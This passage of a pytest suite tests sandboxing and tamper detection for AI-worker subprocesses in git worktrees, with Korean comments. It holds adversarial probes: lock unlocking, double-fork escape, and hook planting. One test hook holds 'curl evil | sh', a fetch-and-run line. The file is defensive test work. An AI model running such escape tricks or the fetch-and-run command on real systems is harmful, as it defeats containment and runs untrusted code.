        "          'commondir': denied(gitdir / 'commondir')}\n"
        "Path('gitwrite.json').write_text(json.dumps(result), encoding='utf-8')\n"
    )
    result = run_provider(
        ProviderCommand(
            name="git-write-probe",
            argv=(sys.executable, "-c", program, str(common), str(gitdir)),
        ),
        prompt="",
        cwd=worker.path,
    )

    assert result.failed is False, result.stderr
    observed = json.loads((worker.path / "gitwrite.json").read_text(encoding="utf-8"))
    assert observed["add"] == 0, observed["stderr"]
    assert observed["commit"] == 0, observed["stderr"]
    assert observed["hooks"] is True
    assert observed["config"] is True
    assert observed["config-worktree"] is True
    assert observed["commondir"] is True
    landed = _git("log", "-1", "--format=%s", cwd=worker.path).stdout.strip()
    assert landed == "worker commit"


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_provider_revalidates_worktree_identity_after_spawn(tmp_path, monkeypatch):
    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="identity-worker"),
    )
    sibling = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="identity-sibling"),
    )
    marker = worker.path / "provider-started"
    program = (
        "import time; from pathlib import Path; "
        "time.sleep(0.5); Path('provider-started').write_text('started')"
    )
    real_popen = PROVIDER_PROCESS.subprocess.Popen
    swapped = False

    def swap_identity_after_spawn(*args, **kwargs):
        nonlocal swapped
        command = args[0] if args else kwargs["args"]
        normalized = tuple(str(item) for item in command)
        proc = real_popen(*args, **kwargs)
        if not swapped and program in normalized:
            swapped = True
            (worker.path / ".git").write_bytes((sibling.path / ".git").read_bytes())
        return proc

    monkeypatch.setattr(
        PROVIDER_PROCESS.subprocess,
        "Popen",
        swap_identity_after_spawn,
    )
    result = run_provider(
        ProviderCommand(
            name="identity-swap",
            argv=(sys.executable, "-c", program),
        ),
        prompt="",
        cwd=worker.path,
    )

    assert swapped is True
    assert result.failed is True
    assert "worktree" in result.stderr
    assert not marker.exists()


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_read_only_provider_cannot_write_verified_worktree(tmp_path):
    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="reviewer"),
    )
    marker = worker.path / "reviewer-write.txt"
    program = (
        "from pathlib import Path; import sys; "
        "target = Path(sys.argv[1]); "
        "\ntry:\n target.write_text('leak', encoding='utf-8')\n"
        "except OSError:\n print('denied')\n"
    )
    result = run_provider(
        ProviderCommand(
            name="read-only-reviewer",
            argv=(sys.executable, "-c", program, str(marker)),
            allow_workspace_writes=False,
        ),
        prompt="",
        cwd=worker.path,
    )

    assert result.failed is False, result.stderr
    assert result.stdout.strip() == "denied"
    assert not marker.exists()

@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_provider_cannot_unlock_its_repository_lease(tmp_path):
    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="lease-adversary"),
    )
    ready = worker.path / "unlock-attempted"
    program = (
        "import fcntl, json, os, sys, time\n"
        "from pathlib import Path\n"
        "unlocked = {}\n"
        "for fd in range(3, 256):\n"
        "    try: fcntl.flock(fd, fcntl.LOCK_UN); unlocked[fd] = os.readlink(f'/dev/fd/{fd}')\n"
        "    except OSError: pass\n"
        "Path(sys.argv[1]).write_text(json.dumps(unlocked), encoding='utf-8')\n"
        "time.sleep(1)\n"
    )
    with ThreadPoolExecutor(max_workers=1) as pool:
        future = pool.submit(
            run_provider,
            ProviderCommand(
                name="lease-adversary",
                argv=(sys.executable, "-c", program, str(ready)),
            ),
            prompt="",
            cwd=worker.path,
        )
        deadline = time.monotonic() + 2
        while not ready.exists() and time.monotonic() < deadline:
            time.sleep(0.01)
        assert ready.exists()
        assert probe_provider_leases(worker.path) == "active"
        result = future.result(timeout=3)

        unlocked = json.loads(ready.read_text(encoding="utf-8"))
        assert all("provider-leases" not in path for path in unlocked.values())
    assert result.failed is False, result.stderr


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_escaped_provider_descendant_keeps_repository_lease(tmp_path):
    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="descendant"),
    )
    ready = worker.path / "descendant-ready"
    done = worker.path / "descendant-done"
    program = (
        "import os, sys, time\n"
        "from pathlib import Path\n"
        "ready, done = map(Path, sys.argv[1:3])\n"
        "child = os.fork()\n"
        "if child == 0:\n"
        "    os.setsid()\n"
        "    grandchild = os.fork()\n"
        "    if grandchild:\n"
        "        os._exit(0)\n"
        "    ready.write_text('ready', encoding='utf-8')\n"
        "    time.sleep(1.5)\n"
        "    done.write_text('done', encoding='utf-8')\n"
        "    os._exit(0)\n"
        "os.waitpid(child, 0)\n"
    )

    result = run_provider(
        ProviderCommand(
            name="escaped-descendant",
            argv=(
                sys.executable,
                "-c",
                program,
                str(ready),
                str(done),
            ),
        ),
        prompt="",
        cwd=worker.path,
    )

    assert result.failed is True
    assert "provider descendant remains active" in result.stderr
    deadline = time.monotonic() + 2
    while not ready.exists() and time.monotonic() < deadline:
        time.sleep(0.01)
    assert ready.exists()
    assert probe_provider_leases(worker.path) == "active"
    deadline = time.monotonic() + 3
    while (
        (not done.exists() or probe_provider_leases(worker.path) != "inactive")
        and time.monotonic() < deadline
    ):
        time.sleep(0.01)
    assert done.exists()
    assert probe_provider_leases(worker.path) == "inactive"


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_provider_output_is_bounded_for_sync_and_parallel_paths(tmp_path):
    from agent_flow.providers.subprocess import MAX_PROVIDER_OUTPUT_BYTES
    from agent_flow.subprocess_pool import (
        SubprocessJob,
        run_parallel,
    )

    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="output-bound"),
    )
    chunk_size = MAX_PROVIDER_OUTPUT_BYTES // 2 + 4096
    program = (
        "import os, sys, time\n"
        "size = int(sys.argv[1])\n"
        "os.write(1, b'o' * size)\n"
        "os.write(2, b'e' * size)\n"
        "time.sleep(30)\n"
    )

    sync_result = run_provider(
        ProviderCommand(
            name="bounded-sync",
            argv=(sys.executable, "-c", program, str(chunk_size)),
            timeout_s=10,
        ),
        prompt="",
        cwd=worker.path,
    )
    parallel_result = run_parallel(
        [
            SubprocessJob(
                job_id="bounded-parallel",
                binary=sys.executable,
                args=("-c", program, str(chunk_size)),
                cwd=worker.path,
                timeout_s=10,
            )
        ]
    )[0]

    assert sync_result.failed is True
    assert "provider output exceeded" in sync_result.stderr
    assert (
        len(sync_result.stdout.encode()) + len(sync_result.stderr.encode())
        <= MAX_PROVIDER_OUTPUT_BYTES + 256
    )
    assert parallel_result.error == (
        f"provider output exceeded {MAX_PROVIDER_OUTPUT_BYTES} bytes"
    )
    assert (
        len(parallel_result.stdout.encode())
        + len(parallel_result.stderr.encode())
        <= MAX_PROVIDER_OUTPUT_BYTES
    )


@pytest.mark.skipif(
    sys.platform != "darwin" or not Path("/usr/bin/sandbox-exec").is_file(),
    reason="macOS sandbox-exec confinement is required",
)
def test_provider_timeouts_reap_sync_and_parallel_processes(tmp_path):
    from agent_flow.subprocess_pool import SubprocessJob, run_parallel

    _init_repo(tmp_path)
    worker = W.create_worktree(
        root=tmp_path,
        plan=W.plan_worktree(root=tmp_path, name="timeout-reap"),
    )
    sync_marker = worker.path / "sync-survived"
    parallel_marker = worker.path / "parallel-survived"
    program = (
        "import sys, time\n"
        "from pathlib import Path\n"
        "time.sleep(0.5)\n"
        "Path(sys.argv[1]).write_text('survived', encoding='utf-8')\n"
    )
    started = time.monotonic()
    sync_result = run_provider(
        ProviderCommand(
            name="timeout-sync",
            argv=(sys.executable, "-c", program, str(sync_marker)),
            timeout_s=0.05,
        ),
        prompt="",
        cwd=worker.path,
    )
    parallel_result = run_parallel(
        [
            SubprocessJob(
                job_id="timeout-parallel",
                binary=sys.executable,
                args=("-c", program, str(parallel_marker)),
                cwd=worker.path,
                timeout_s=0.05,
            )
        ]
    )[0]
    elapsed = time.monotonic() - started
    time.sleep(0.6)

    assert sync_result.failed is True
    assert sync_result.exit_code is None
    assert parallel_result.timed_out is True
    assert elapsed < 3
    assert not sync_marker.exists()
    assert not parallel_marker.exists()


def test_git_repo_state_classifies(tmp_path):
    from agent_flow.core import worktree_isolation as wi
    # fresh temp dir is not a git repo (and not under one)
    assert wi.git_repo_state(tmp_path) == "non-repo"
    _init_repo(tmp_path)
    assert wi.git_repo_state(tmp_path) == "repo"


def test_git_repo_state_unknown_on_git_failure(tmp_path, monkeypatch):
    from agent_flow.core import worktree_isolation as wi
    from agent_flow.core.commands import SafeCommandResult
    _init_repo(tmp_path)
    # a git call that times out must classify as unknown, not non-repo, so the
    # caller fails closed instead of running a worker unisolated in the leader.
    monkeypatch.setattr(
        wi, "git_safe",
        lambda *a, **k: SafeCommandResult(args=("git",), returncode=None, stdout="", stderr="", timed_out=True),
    )
    assert wi.git_repo_state(tmp_path) == "unknown"


def test_scope_gate_ignores_same_worker_self_overlap():
    """불변: 같은 worker의 자기 자신과의 겹침은 충돌이 아니고, 다른 worker면 충돌이다."""
    same_scope = ("src/x.py",)
    # 한 worker가 두 task에 같은 scope로 승인된 경우는 충돌이 아니다.
    assert_scopes_isolated([
        WorkerScope("w1", same_scope, False),
        WorkerScope("w1", same_scope, False),
    ])
    # worker 이름 하나만 바꾸면 동일한 scope가 거부된다 — 자기 겹침 예외가
    # 게이트를 통째로 무력화한 것이 아님을 보인다.
    with pytest.raises(WorktreeIsolationError):
        assert_scopes_isolated([
            WorkerScope("w1", same_scope, False),
            WorkerScope("w2", same_scope, False),
        ])


def test_e2e_non_git_provider_launch_is_rejected(tmp_path):
    assert _cli(
        ["team", "init", "--root", ".", "--name", "ft"],
        cwd=tmp_path,
    ).returncode == 0
    assert _cli(
        [
            "team", "task", "--root", ".", "--team", "ft", "--id", "t1",
            "--subject", "s", "--description", "d",
        ],
        cwd=tmp_path,
    ).returncode == 0
    assert _cli(
        [
            "team", "worker", "--root", ".", "--team", "ft", "--name", "w1",
            "--role", "impl",
        ],
        cwd=tmp_path,
    ).returncode == 0
    assert _cli(
        [
            "team", "brief", "--root", ".", "--team", "ft", "--task", "t1",
            "--worker", "w1", "--brief", "b", "--write-scope", "src/feature",
        ],
        cwd=tmp_path,
    ).returncode == 0
    assert _cli(
        [
            "team", "approve-worker", "--root", ".", "--team", "ft",
            "--task", "t1", "--worker", "w1", "--write-scope", "src/feature",
        ],
        cwd=tmp_path,
    ).returncode == 0

    result = _cli(
        [
            "team", "run-next", "--root", ".", "--team", "ft",
            "--worker", "w1", "--command", sys.executable, "-c",
            "print('must not run')",
        ],
        cwd=tmp_path,
    )
    assert result.returncode == 2
    assert "verified linked git worktree" in (result.stdout + result.stderr)
    assert "must not run" not in result.stdout


def _leader_state(root: Path) -> tuple[str, str, str]:
    return (
        _git("rev-parse", "HEAD", cwd=root).stdout.strip(),
        _git("rev-parse", "--abbrev-ref", "HEAD", cwd=root).stdout.strip(),
        _git("status", "--porcelain", cwd=root).stdout,
    )


def _isolated(tmp_path: Path, name: str = "tw"):
    """leader + 그 안의 검증된 linked worktree 한 쌍."""
    _init_repo(tmp_path)
    (tmp_path / ".gitignore").write_text(".agent-flow/\n", encoding="utf-8")
    _git("add", ".gitignore", cwd=tmp_path)
    _git("commit", "-m", "ignore agent-flow", cwd=tmp_path)
    plan = W.plan_worktree(root=tmp_path, name=name)
    status = W.create_worktree(root=tmp_path, plan=plan)
    return status, capture_leader_snapshot(tmp_path)


def test_tripwire_detects_absolute_path_write_to_leader(tmp_path):
    """불변: 워커가 절대경로로 leader의 추적 파일을 고치면 phase가 통과하지 못한다."""
    status, before = _isolated(tmp_path, "abs")
    (tmp_path / "tracked.txt").write_text("leaked by worker\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
        W_ISO.assert_leader_unchanged(tmp_path, before)
    assert "tracked.txt" in str(caught.value)
    # 탐지 전용이다. 흘린 내용은 그대로 남아 있어야 한다.
    assert (tmp_path / "tracked.txt").read_text() == "leaked by worker\n"


def test_tripwire_detects_parent_traversal_write(tmp_path):
    """불변: worktree에서 `../..`로 올라가 leader에 쓰면 잡힌다."""
    status, before = _isolated(tmp_path, "trav")
    escaped = status.path / ".." / ".." / ".." / "escaped.txt"
    escaped.resolve().parent.mkdir(parents=True, exist_ok=True)
    escaped.resolve().write_text("escaped\n", encoding="utf-8")
    if real_path(escaped.resolve().parent) != real_path(tmp_path):
        pytest.skip("worktree layout does not place the leader three levels up")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_leader_branch_switch(tmp_path):
    """불변: 브랜치가 바뀌면 워킹트리 내용이 통째로 달라지는데 status 축은 clean이다.

    HEAD 완화는 **같은 브랜치**의 전진에만 준다. 브랜치 전환은 그 조건에서 빠진다.
    """
    status, before = _isolated(tmp_path, "branch")
    _git("checkout", "-q", "-b", "sneaky", cwd=tmp_path)
    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
        W_ISO.assert_leader_unchanged(tmp_path, before)
    assert "branch switched" in str(caught.value)
    # 되돌리지 않는다. 사용자가 어디에 있는지 스스로 알 수 있어야 한다.
    assert _git("rev-parse", "--abbrev-ref", "HEAD", cwd=tmp_path).stdout.strip() == "sneaky"


def test_tripwire_accepts_a_same_branch_advance_the_leader_recorded(tmp_path):
    """반증: 사람의 평범한 `git pull`로 워커가 멈추면 그 정지를 푸는 수단이 따로
    필요해지고, 그 수단이 다시 경계 뒤에 갇힌다.

    같은 브랜치 + 조상 관계 + leader reflog 기록 셋을 모두 만족하면 워커 소행이
    아님이 증명되므로 통과한다.
    """
    status, before = _isolated(tmp_path, "advance")
    (tmp_path / "human.txt").write_text("human commit\n", encoding="utf-8")
    _git("add", "human.txt", cwd=tmp_path)
    _git("commit", "-q", "-m", "human advances the leader", cwd=tmp_path)
    W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_a_head_move_the_leader_never_recorded(tmp_path):
    """불변: 공유 ref를 leader 밖에서 밀어 넣으면 leader reflog는 그대로다.

    다른 worktree가 `update-ref`로 leader의 브랜치를 움직였을 때의 관측 상태를,
    leader에서 커밋한 뒤 reflog 마지막 줄을 지워 그대로 재현한다. 대조군은 같은
    커밋을 reflog 손대지 않은 상태로 둔 위 테스트다.
    """
    status, before = _isolated(tmp_path, "external")
    (tmp_path / "pushed.txt").write_text("from elsewhere\n", encoding="utf-8")
    _git("add", "pushed.txt", cwd=tmp_path)
    _git("commit", "-q", "-m", "pushed from elsewhere", cwd=tmp_path)
    reflog = tmp_path / ".git" / "logs" / "HEAD"
    kept = reflog.read_text(encoding="utf-8").splitlines()[:-1]
    reflog.write_text("".join(f"{line}\n" for line in kept), encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
        W_ISO.assert_leader_unchanged(tmp_path, before)
    message = str(caught.value)
    assert "HEAD moved" in message
    assert "without the leader checkout recording it" in message


def test_tripwire_detects_a_leader_reset_even_though_the_leader_recorded_it(tmp_path):
    """불변: reflog 기록만으로 정상이라 부르면 leader를 겨눈 `reset --hard`가 통과한다.

    그 명령은 leader에서 도는 것이므로 leader reflog에 남는다. 조상 관계가 함께
    요구되어야 뒤로 가는 이동이 걸린다.
    """
    status, before = _isolated(tmp_path, "reset")
    (tmp_path / "doomed.txt").write_text("about to vanish\n", encoding="utf-8")
    _git("add", "doomed.txt", cwd=tmp_path)
    _git("commit", "-q", "-m", "commit that a reset would drop", cwd=tmp_path)
    after_commit = W_ISO.capture_leader_snapshot(tmp_path)
    _git("reset", "-q", "--hard", "HEAD~1", cwd=tmp_path)
    with pytest.raises(W_ISO.WorktreeIsolationError) as caught:
        W_ISO.assert_leader_unchanged(tmp_path, after_commit)
    assert "HEAD moved" in str(caught.value)


def test_tripwire_ignores_agent_runtime_writes(tmp_path):
    """불변: `.agent-flow/` 쓰기는 오염이 아니다.

    L2 Read hook은 worktree 안에서 돌아도 leader의
    `.agent-flow/skills-read.jsonl`에 append한다. runner는 `.agent-flow/runs/`를,
    JS는 `.agent-flow/state/`를 쓴다. 여기를 감시하면 정상 동작이 100% 오탐이
    되고, 오탐 한 번이 완료된 리뷰어 산출물과 claim된 task를 날린다.
    """
    status, before = _isolated(tmp_path, "runtime")
    for rel in (
        ".agent-flow/skills-read.jsonl",
        ".agent-flow/state/current-run.json",
        ".agent-flow/runs/default/r1/meta.json",
    ):
        target = tmp_path / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("{}\n", encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)

    # 같은 실행에서 바깥 쓰기는 여전히 잡힌다 — 무장 해제가 아니다.
    (tmp_path / "leaked.txt").write_text("worker leak\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_ignores_finder_ds_store_updates(tmp_path):
    _isolated(tmp_path, "finder-metadata")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    root_metadata = tmp_path / ".DS_Store"
    nested_metadata = tmp_path / ".agent-flow" / ".DS_Store"
    nested_metadata.parent.mkdir(parents=True, exist_ok=True)

    def assert_metadata_is_ignored() -> None:
        try:
            W_ISO.assert_leader_unchanged(tmp_path, before)
        except W_ISO.WorktreeIsolationError as exc:
            pytest.fail(f"Finder metadata triggered the leader tripwire: {exc}")

    root_metadata.write_bytes(b"root-v1")
    nested_metadata.write_bytes(b"nested-v1")
    assert_metadata_is_ignored()

    root_metadata.write_bytes(b"root-v2")
    nested_metadata.write_bytes(b"nested-v2")
    assert_metadata_is_ignored()

    root_metadata.unlink()
    nested_metadata.unlink()
    assert_metadata_is_ignored()

    root_metadata.write_bytes(b"tracked-v1")
    nested_metadata.write_bytes(b"tracked-nested-v1")
    _git("add", "-f", ".DS_Store", ".agent-flow/.DS_Store", cwd=tmp_path)
    _git("commit", "-m", "track Finder metadata", cwd=tmp_path)
    before = W_ISO.capture_leader_snapshot(tmp_path)
    root_metadata.write_bytes(b"tracked-v2")
    nested_metadata.write_bytes(b"tracked-nested-v2")
    assert_metadata_is_ignored()

    (tmp_path / "worker-leak.txt").write_text("leaked\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_hook_planted_in_leader(tmp_path):
    """불변: `.agent-flow/scripts/hooks/`는 감시한다.

    런타임 상태(`runs`/`state`/`skills-read.jsonl`)를 오탐 때문에 제외했다고
    `.agent-flow/`를 통째로 비우면, host가 매 tool call마다 **실행하는** hook
    디렉터리가 사각지대가 된다. 워커가 여기 심으면 반드시 잡혀야 한다.
    """
    status, before = _isolated(tmp_path, "hooks")
    planted = tmp_path / ".agent-flow" / "scripts" / "hooks" / "EVIL.sh"
    planted.parent.mkdir(parents=True, exist_ok=True)
    planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_hook_content_swap(tmp_path):
    """불변: 이미 있던 hook의 내용 교체도 잡는다. 상태 문자는 그대로다."""
    _isolated(tmp_path, "hookswap")
    hook = tmp_path / ".agent-flow" / "scripts" / "hooks" / "guard.sh"
    hook.parent.mkdir(parents=True, exist_ok=True)
    hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    hook.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_same_size_middle_change_in_large_file(tmp_path):
    """불변: 큰 ignored/untracked 파일도 크기 표본이 아니라 전체 내용으로 판정한다."""
    _isolated(tmp_path, "large-content")
    large = tmp_path / "large.bin"
    with large.open("wb") as handle:
        handle.truncate(65 * 1024 * 1024)
    before = W_ISO.capture_leader_snapshot(tmp_path)

    with large.open("r+b") as handle:
        handle.seek(32 * 1024 * 1024)
        handle.write(b"leak")

    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_file_replaced_by_symlink(tmp_path):
    """불변: 같은 내용의 symlink로 바꿔치기해도 잡는다.

    `stat`은 대상을 따라가 구분을 잃는다. `lstat`이어야 한다. 링크 대상은
    스냅샷 **전에** 만들어 둔다. 대상이 새 파일이면 그 신규 레코드만으로도
    탐지돼 정작 symlink 교체를 보는지 알 수 없다.
    """
    _isolated(tmp_path, "symlink")
    note = tmp_path / "note.txt"
    note.write_text("same\n", encoding="utf-8")
    target = tmp_path / "elsewhere.txt"
    target.write_text("same\n", encoding="utf-8")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    note.unlink()
    note.symlink_to(target)
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_status_record_path_keeps_rename_source_with_spaces(tmp_path):
    """불변: 상태 문자 없는 rename 원본 레코드를 3글자 잘라내지 않는다."""
    assert W_ISO._status_record_path("?? db backup.sql") == "db backup.sql"
    assert W_ISO._status_record_path("db backup.sql") == "db backup.sql"
    assert W_ISO._status_record_path(" M a.txt") == "a.txt"


def test_tripwire_ignores_identical_rewrite_of_dirty_file(tmp_path):
    """불변: 같은 바이트로 다시 저장하는 것은 변경이 아니다.

    mtime을 지표로 쓰면 에디터 저장·포매터·빌드만으로 터진다.
    """
    _isolated(tmp_path, "same-bytes")
    tracked = tmp_path / "tracked.txt"
    tracked.write_text("user edit\n", encoding="utf-8")
    scratch = tmp_path / "scratch.txt"
    scratch.write_text("user scratch\n", encoding="utf-8")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    time.sleep(0.01)
    tracked.write_text("user edit\n", encoding="utf-8")
    scratch.write_text("user scratch\n", encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)

    # 내용이 실제로 바뀌면 untracked 파일도 잡힌다.
    scratch.write_text("worker overwrote it\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_detects_content_change_of_already_dirty_file(tmp_path):
    """불변: 이미 더러운 파일을 워커가 덧쓰면 status 문자는 그대로여도 잡힌다."""
    status, before0 = _isolated(tmp_path, "dirty")
    (tmp_path / "tracked.txt").write_text("user edit\n", encoding="utf-8")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    # 상태 문자는 ' M tracked.txt'로 동일하다. tracked-content 해시만이 이 재수정을 본다.
    (tmp_path / "tracked.txt").write_text("worker overwrote it\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tripwire_watches_paths_git_was_told_to_ignore(tmp_path):
    """반증: `assume-unchanged`/`skip-worktree`는 status와 diff를 **동시에** 침묵시킨다.

    그 표시가 붙은 파일에 대한 쓰기는 두 신호 어디에도 남지 않는다. 사전 차단을
    두 규칙(보호 경로 리터럴, 파괴 명령)으로 줄인 뒤 tripwire가 주 기제가 됐으므로
    이 침묵은 그냥 구멍이다 — 표시 여부와 무관하게 "phase 도중 leader는 그대로"라는
    계약은 같다.

    sparse checkout은 제외 파일 **전부**를 `S`로 표시한다. 그 파일들은 디스크에 없으니
    감시 대상이 아니어야 한다 — 아니면 monorepo 하나가 스냅샷마다 수만 줄을 만든다.
    """
    _isolated(tmp_path, "index-flags")
    assumed = tmp_path / "assumed.txt"
    skipped = tmp_path / "skipped.txt"
    absent = tmp_path / "sparse-excluded.txt"
    for path in (assumed, skipped, absent):
        path.write_text("v1\n", encoding="utf-8")
    _git("add", "assumed.txt", "skipped.txt", "sparse-excluded.txt", cwd=tmp_path)
    _git("commit", "-m", "tracked files behind index flags", cwd=tmp_path)
    _git("update-index", "--assume-unchanged", "assumed.txt", cwd=tmp_path)
    _git("update-index", "--skip-worktree", "skipped.txt", cwd=tmp_path)
    _git("update-index", "--skip-worktree", "sparse-excluded.txt", cwd=tmp_path)
    absent.unlink()

    before = W_ISO.capture_leader_snapshot(tmp_path)
    assert "sparse-excluded.txt" not in before.status

    assumed.write_text("worker overwrote it\n", encoding="utf-8")
    # 전제 확인: git은 정말로 침묵한다. 이 두 줄이 깨지면 이 테스트의 이유가 사라진다.
    assert _git("status", "--porcelain", cwd=tmp_path).stdout.strip() == ""
    assert _git("diff", "HEAD", "--name-only", cwd=tmp_path).stdout.strip() == ""
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)

    assumed.write_text("v1\n", encoding="utf-8")
    skipped.write_text("worker overwrote it\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)

    # 되돌리면 통과해야 한다. 표시된 경로를 감시한다는 것이 상수 오탐을 뜻하면 안 된다.
    skipped.write_text("v1\n", encoding="utf-8")
    W_ISO.assert_leader_unchanged(tmp_path, before)


def test_tracked_digest_ignores_repo_configured_diff_drivers(tmp_path):
    """반증: `git diff`의 출력과 **실행 방식**을 관측 대상이 고를 수 있다.

    `.gitattributes`가 지목한 driver의 `textconv`/`command`는 diff 본문을 그
    프로그램의 출력으로 대체하고, git은 스냅샷마다 그것을 실제로 실행한다. 그러면
    두 가지가 깨진다.

    (1) 양쪽 출력이 같아지는 필터에서는 tracked-content digest가 상수가 되어 재수정
    신호를 잃는다. leader 오염 탐지가 `_path_content_stamp` 한 겹에만 남는다.
    (2) tripwire가 저장소 설정이 고른 프로그램을 실행한다. 관측이 관측 대상에게
    코드 실행을 허용하면 그건 경계가 아니다.
    """
    _isolated(tmp_path, "diff-driver")
    (tmp_path / ".gitattributes").write_text(
        "masked.txt diff=fixed\n", encoding="utf-8"
    )
    masked = tmp_path / "masked.txt"
    masked.write_text("a=1\n", encoding="utf-8")
    _git("add", ".gitattributes", "masked.txt", cwd=tmp_path)
    _git("commit", "-m", "tracked file behind a diff driver", cwd=tmp_path)
    # 스크립트와 마커는 leader 밖에 둔다. 안에 두면 그 자체가 상태 변경이 된다.
    marker = tmp_path.parent / f"{tmp_path.name}-driver-ran"
    driver = tmp_path.parent / f"{tmp_path.name}-driver.sh"
    driver.write_text(
        f"#!/bin/sh\n: > {marker}\nexit 0\n",
        encoding="utf-8",
    )
    driver.chmod(0o755)

    for setting in ("diff.fixed.textconv", "diff.fixed.command"):
        _git("config", setting, str(driver), cwd=tmp_path)
        masked.write_text("dirty before the phase\n", encoding="utf-8")
        first = W_ISO._tracked_content_digest(tmp_path)
        masked.write_text("worker overwrote it\n", encoding="utf-8")
        assert W_ISO._tracked_content_digest(tmp_path) != first, setting

        marker.unlink(missing_ok=True)
        W_ISO.capture_leader_snapshot(tmp_path)
        assert not marker.exists(), f"{setting} ran repo-configured code in the tripwire"
        _git("config", "--unset", setting, cwd=tmp_path)


def test_tripwire_never_touches_user_work(tmp_path):
    """불변: 감지는 하되 **아무것도 되돌리지 않는다.** 사용자의 미커밋 작업이 살아남아야 한다.

    이 테스트가 이전 설계(rescue + `reset --hard`)를 폐기한 이유다. 그 설계는
    사람이 편집 중이던 leader 파일을 마지막 커밋으로 되돌려 실제로 파괴했다.
    """
    status, _ = _isolated(tmp_path, "userwork")
    (tmp_path / "tracked.txt").write_text("USER WORK IN PROGRESS\n", encoding="utf-8")
    (tmp_path / "scratch.txt").write_text("user scratch\n", encoding="utf-8")
    before = W_ISO.capture_leader_snapshot(tmp_path)
    head_before = _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip()

    (tmp_path / "leaked.txt").write_text("worker leak\n", encoding="utf-8")
    with pytest.raises(W_ISO.WorktreeIsolationError):
        W_ISO.assert_leader_unchanged(tmp_path, before)

    assert (tmp_path / "tracked.txt").read_text() == "USER WORK IN PROGRESS\n"
    assert (tmp_path / "scratch.txt").read_text() == "user scratch\n"
    assert (tmp_path / "leaked.txt").exists()
    assert _git("rev-parse", "HEAD", cwd=tmp_path).stdout.strip() == head_before


def test_recovery_commands_bypass_tripwire(tmp_path):
    """불변: leader가 오염된 상태에서도 복구 명령은 막히지 않는다 (#87 데드락 회귀 방지)."""
    status, _before = _isolated(tmp_path, "recover")
    # 오염을 남겨 둔 채로 복구 명령을 부른다. 검증이 실패 상태를 붙잡고 있으면
    # 사용자가 빠져나갈 방법이 없어진다 — 그 상황을 금지한다.
    (tmp_path / "f.txt").write_text("leader is contaminated\n", encoding="utf-8")
    (tmp_path / "stray.txt").write_text("stray\n", encoding="utf-8")

    for argv in (
        ["status", "--root", "."],
        ["worktree", "list", "--root", "."],
        ["abort", "--root", "."],
        ["worktree", "remove", "--root", ".", "--name", status.name],
    ):
        result = _cli(argv, cwd=tmp_path)
        assert result.returncode == 0, f"{argv} blocked: {result.stdout}{result.stderr}"

    # 복구 명령은 tripwire를 거치지 않으므로 오염을 치우지도 않는다. 판단은
    # 사용자 몫으로 남고, 명령이 막히지 않는다는 사실만 보장한다.
    assert (tmp_path / "f.txt").read_text(encoding="utf-8") == "leader is contaminated\n"
    assert (tmp_path / "stray.txt").exists()

